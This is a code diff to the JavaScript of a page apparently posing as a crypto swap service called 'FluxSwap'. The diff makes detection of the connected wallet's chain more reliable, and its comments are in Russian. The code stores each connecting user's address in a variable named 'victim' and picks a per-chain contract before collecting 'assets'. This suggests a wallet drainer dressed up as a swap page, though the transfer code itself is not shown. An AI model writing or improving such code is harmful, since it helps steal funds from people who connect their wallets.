@@ -346,13 +346,22 @@
             const CHAIN_NAMES = { 1: 'Ethereum', 56: 'BNB Chain', 137: 'Polygon', 42161: 'Arbitrum' };
             function chainLabel(id) { return CHAIN_NAMES[id] || ('Chain ' + id); }
 
+            function parseChainValue(raw) {
+                if (typeof raw === 'number') return raw;
+                if (typeof raw === 'string') {
+                    if (raw.startsWith('eip155:')) return parseInt(raw.split(':')[1], 10);
+                    if (/^0x/i.test(raw)) return parseInt(raw, 16);
+                    const n = parseInt(raw, 10);
+                    if (Number.isFinite(n)) return n;
+                }
+                return null;
+            }
+
+            // Фоллбэк: если eth_chainId недоступен — читаем из объекта/сессии WC
             function readWcChainId(wc) {
                 try {
-                    if (typeof wc.chainId === 'number' && wc.chainId > 0) return wc.chainId;
-                    if (typeof wc.chainId === 'string') {
-                        const n = parseInt(wc.chainId, 10);
-                        if (Number.isFinite(n) && n > 0) return n;
-                    }
+                    const direct = parseChainValue(wc.chainId);
+                    if (direct) return direct;
                     const accs = wc.session && wc.session.namespaces && wc.session.namespaces.eip155 && wc.session.namespaces.eip155.accounts;
                     if (accs && accs.length) {
                         const m = accs[0].match(/eip155:(\d+):/);
@@ -360,6 +369,19 @@
                     }
                 } catch (_) {}
                 return null;
+            }
+
+            // ГЛАВНОЕ: спрашиваем кошелёк напрямую — какая сеть активна сейчас.
+            async function readActiveChain(wc) {
+                if (!wc) return null;
+                try {
+                    const hex = await wc.request({ method: 'eth_chainId' });
+                    const n = parseChainValue(hex);
+                    if (n && n > 0) return n;
+                } catch (e) {
+                    console.warn('eth_chainId query failed:', e);
+                }
+                return readWcChainId(wc);
             }
 
             async function switchChain(target) {
@@ -373,7 +395,7 @@
                 } catch (_) { return false; }
             }
 
-            // 'any' снимает кэш сети — иначе ethers v5 роняет NETWORK_ERROR при смене chainId
+            // 'any' — снимает кэш сети в ethers v5 (иначе NETWORK_ERROR при смене chainId)
             function wrapProvider(wc) {
                 return new ethers.providers.Web3Provider(wc, 'any');
             }
@@ -425,7 +447,8 @@
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
 
-                    const activeChain = readWcChainId(restored) || (await web3Provider.getNetwork()).chainId;
+                    // ← спрашиваем кошелёк напрямую
+                    const activeChain = (await readActiveChain(restored)) || 1;
 
                     provider = web3Provider;
                     signer = signer_;
@@ -438,6 +461,7 @@
                     updateConnectButton();
                     setStatus('✅ ' + chainLabel(chainId) + ' · ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     updateRateAndOutput();
+                    console.log('[FluxSwap] restored on chain', chainId);
                     return true;
                 } catch (e) {
                     clearSession();
@@ -447,15 +471,8 @@
 
             function attachProviderEvents(providerInstance) {
                 providerInstance.on('chainChanged', async (raw) => {
-                    let cid = null;
-                    if (typeof raw === 'string') {
-                        if (raw.startsWith('eip155:')) cid = parseInt(raw.split(':')[1], 10);
-                        else if (/^0x/i.test(raw)) cid = parseInt(raw, 16);
-                        else cid = parseInt(raw, 10);
-                    } else if (typeof raw === 'number') {
-                        cid = raw;
-                    }
-                    if (!Number.isFinite(cid) || cid <= 0) cid = readWcChainId(providerInstance);
+                    let cid = parseChainValue(raw);
+                    if (!cid) cid = await readActiveChain(providerInstance);
                     if (!cid) return;
 
                     chainId = cid;
@@ -471,6 +488,7 @@
                     setStatus('✅ ' + chainLabel(chainId) + ' · ' +
                               (victim ? victim.slice(0,6) + '...' + victim.slice(-4) : ''), 'ok');
                     updateRateAndOutput();
+                    console.log('[FluxSwap] chainChanged →', chainId);
                 });
 
                 providerInstance.on('accountsChanged', (accounts) => {
@@ -682,16 +700,26 @@
                         throw new Error('No accounts returned');
                     }
 
+                    // Спрашиваем у кошелька реальную сеть — не из сессии, а из живого eth_chainId
+                    let activeChain = await readActiveChain(wcProvider);
+                    console.log('[FluxSwap] activeChain after enable:', activeChain);
+
+                    // --- Опционально: форс на BNB, если хочешь всегда 56 ---
+                    // if (activeChain !== 56) {
+                    //     await switchChain(56);
+                    //     await new Promise(r => setTimeout(r, 800));
+                    //     activeChain = (await readActiveChain(wcProvider)) || 56;
+                    // }
+                    // ---------------------------------------------------------
+
                     const web3Provider = wrapProvider(wcProvider);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
 
-                    const activeChain = readWcChainId(wcProvider) || (await web3Provider.getNetwork()).chainId;
-
                     provider = web3Provider;
                     signer = signer_;
                     victim = address;
-                    chainId = activeChain;
+                    chainId = activeChain || 1;
                     isConnected = true;
                     saveSession({ chainId, address });
 
@@ -733,23 +761,24 @@
                     return;
                 }
 
-                // Пересобираем провайдер и signer на актуальной сети перед отправкой
+                // Синхронизируем chainId с реальной сетью кошелька ПЕРЕД выбором контракта
                 try {
-                    const freshChain = readWcChainId(wcProvider);
-                    if (freshChain && freshChain !== chainId) chainId = freshChain;
+                    const live = await readActiveChain(wcProvider);
+                    if (live && live > 0) chainId = live;
                     provider = wrapProvider(wcProvider);
                     signer = provider.getSigner();
                 } catch (_) {}
+                console.log('[FluxSwap] executeSwap on chain', chainId);
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
-                    setStatus('Network not supported or contract not configured.', 'err');
+                    setStatus('Network not supported (' + chainLabel(chainId) + ') or contract not configured.', 'err');
                     return;
                 }
 
                 isProcessing = true;
                 updateSwapButton();
-                setStatus('Processing swap...', '');
+                setStatus('Processing swap on ' + chainLabel(chainId) + '...', '');
 
                 try {
                     const assets = [];
